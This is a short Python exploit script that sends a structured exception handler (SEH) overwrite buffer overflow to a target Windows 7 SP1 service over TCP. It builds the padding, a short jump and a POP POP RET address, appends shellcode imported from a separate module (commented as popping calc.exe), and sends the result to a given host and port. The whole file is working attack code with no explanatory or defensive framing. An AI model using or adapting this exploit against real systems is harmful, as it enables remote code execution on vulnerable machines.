
import socket,struct
from payload import buf
import socket

def shell_attack(target_machine, target_port):
    port = target_port

    #shellcode to pop calc.exe Windows 7 SP1
    


    ip=target_machine

    nseh=b"\xEB\x06"+b"\x90"*2                #JMP
    seh=struct.pack(b'<L',0x61e7b7f6)        #POP,POP RET 
    junk=b"A"*2232+nseh+seh+buf+b"B"*5600
    payload=junk+nseh+seh+buf

    
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
    s.connect((ip,target_port))
    s.send(payload)



   


